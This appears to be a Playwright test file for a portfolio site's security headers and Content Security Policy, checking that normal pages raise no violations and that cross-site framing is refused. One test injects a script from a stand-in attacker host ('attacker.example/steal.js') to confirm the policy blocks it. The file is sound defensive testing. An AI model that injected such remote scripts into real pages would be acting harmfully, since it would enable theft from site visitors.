import { expect, test, type Page } from '@playwright/test';
import { firstSuggestion, record, ui } from './support/profile';

/**
 * The security headers as the production server sends them, and the content
 * policy as a real browser enforces it: everything the site does runs without
 * a single violation, and what an attacker would inject is refused.
 */

const ROUTES = ['/', '/api/health', '/opengraph-image', '/robots.txt', '/sitemap.xml'];

interface Violation {
  readonly directive: string;
  readonly blocked: string;
}

/** Collects every CSP violation the page reports, from before its first script. */
async function recordViolations(page: Page): Promise<() => Promise<Violation[]>> {
  await page.addInitScript(() => {
    const seen: { directive: string; blocked: string }[] = [];
    Object.assign(window, { __cspViolations: seen });
    document.addEventListener('securitypolicyviolation', (event) => {
      seen.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
    });
  });
  return () =>
    page.evaluate(() => (window as unknown as { __cspViolations: Violation[] }).__cspViolations);
}

for (const route of ROUTES) {
  test(`${route} is served with the security headers`, async ({ request }) => {
    const response = await request.get(route);
    const headers = response.headers();

    expect(response.ok()).toBe(true);
    expect(headers['content-security-policy']).toContain("default-src 'self'");
    expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(headers['content-security-policy']).toContain("object-src 'none'");
    expect(headers['content-security-policy']).not.toContain('unsafe-eval');
    expect(headers['strict-transport-security']).toBe('max-age=63072000; includeSubDomains');
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['x-frame-options']).toBe('DENY');
    expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    expect(headers['permissions-policy']).toContain('camera=()');
    expect(headers['x-powered-by']).toBeUndefined();
  });
}

test('the page, a streamed answer and the social image raise no policy violation', async ({
  page,
}) => {
  const violations = await recordViolations(page);
  const consoleErrors: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });

  await page.goto('/');
  await page.getByRole('button', { name: firstSuggestion().label }).click();
  const answer = page.getByRole('article', { name: ui.conversation.answer });
  await expect(answer.getByRole('group', { name: ui.actions.group })).toBeVisible();
  const image = await page.evaluate(async () => {
    const response = await fetch('/opengraph-image');
    return { status: response.status, type: response.headers.get('content-type') };
  });

  expect(image).toEqual({ status: 200, type: 'image/png' });
  expect(await violations()).toEqual([]);
  expect(consoleErrors).toEqual([]);
});

test('a script from another origin is refused', async ({ page }) => {
  const violations = await recordViolations(page);
  await page.goto('/');

  await page.evaluate(() => {
    const script = document.createElement('script');
    script.src = 'https://attacker.example/steal.js';
    document.head.append(script);
  });

  await expect.poll(violations).toContainEqual({
    directive: 'script-src-elem',
    blocked: 'https://attacker.example/steal.js',
  });
});

/** Serves a page on another origin that embeds the site, and waits for the frame to settle. */
async function embedOnAnotherSite(page: Page, siteUrl: string) {
  await page.route('https://embedder.example/', (route) =>
    route.fulfill({
      contentType: 'text/html',
      body: `<iframe src="${siteUrl}" title="Portfolio" onload="document.title='settled'"></iframe>`,
    }),
  );
  await page.goto('https://embedder.example/');
  await expect(page).toHaveTitle('settled');
  return page.frameLocator('iframe').getByRole('heading', { name: record.welcome.heading });
}

test('another site cannot frame the page', async ({ page, baseURL }) => {
  const heading = await embedOnAnotherSite(page, `${String(baseURL)}/`);

  await expect(heading).toHaveCount(0);
});

// The control for the test above: the same embedding, with the two headers
// that forbid it removed, does show the page, so an empty frame there means
// the headers refused it rather than the harness failing to load anything.
test('the page would render in a frame without its framing rules', async ({ page, baseURL }) => {
  await page.route(`${String(baseURL)}/`, async (route) => {
    const response = await route.fetch();
    const {
      'content-security-policy': _policy,
      'x-frame-options': _frameOptions,
      ...headers
    } = response.headers();
    await route.fulfill({ response, headers });
  });

  const heading = await embedOnAnotherSite(page, `${String(baseURL)}/`);

  await expect(heading).toBeVisible();
});
